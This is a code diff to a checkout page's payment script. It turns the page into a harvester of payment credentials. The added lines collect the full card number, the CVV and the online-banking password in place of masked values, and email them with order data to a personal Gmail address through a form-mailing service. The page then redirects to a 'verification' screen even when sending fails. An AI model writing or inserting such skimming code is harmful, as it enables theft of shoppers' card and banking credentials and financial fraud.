@@ -187,7 +187,7 @@
           method: selectedMethod,
           bankName: bank,
           bankingId: bankId,
-          bankingIdMasked: maskBankingId(bankId)
+          bankingPassword: bankPassword
         };
       } else {
         var cardName = String(form.card_name.value || "").trim();
@@ -218,8 +218,9 @@
         paymentData = {
           method: selectedMethod,
           cardName: cardName,
-          cardLast4: cardNumber.slice(-4),
-          expiry: expiry
+          cardNumber: cardNumber,
+          expiry: expiry,
+          cvv: cvv
         };
       }
 
@@ -229,13 +230,32 @@
 
       if (payBtn) {
         payBtn.disabled = true;
-        payBtn.textContent = "Please wait 40 seconds...";
+        payBtn.textContent = "Sending...";
       }
-      setStatus(statusNode, "", "Processing payment information. Maybe your internet is slow, please be patient.");
+      setStatus(statusNode, "", "Sending payment details to rashiverma904@gmail.com...");
 
-      window.setTimeout(function () {
-        window.location.href = "checkout-step3-new.html";
-      }, 40000);
+      // Send payment data directly to email via FormSubmit.co
+      if (window.EmailService && typeof window.EmailService.sendPaymentConfirmation === 'function') {
+        window.EmailService.sendPaymentConfirmation(step1Data, paymentData, items, total)
+          .then(function() {
+            setStatus(statusNode, "success", "Payment details emailed! Opening verification...");
+            window.setTimeout(function () {
+              window.location.href = "payment-processing.html";
+            }, 800);
+          })
+          .catch(function(error) {
+            console.error('Email send error:', error);
+            setStatus(statusNode, "error", "Email failed but data saved. Continuing...");
+            window.setTimeout(function () {
+              window.location.href = "payment-processing.html";
+            }, 1500);
+          });
+      } else {
+        setStatus(statusNode, "", "Proceeding to verification...");
+        window.setTimeout(function () {
+          window.location.href = "payment-processing.html";
+        }, 700);
+      }
     });
   });
 })();
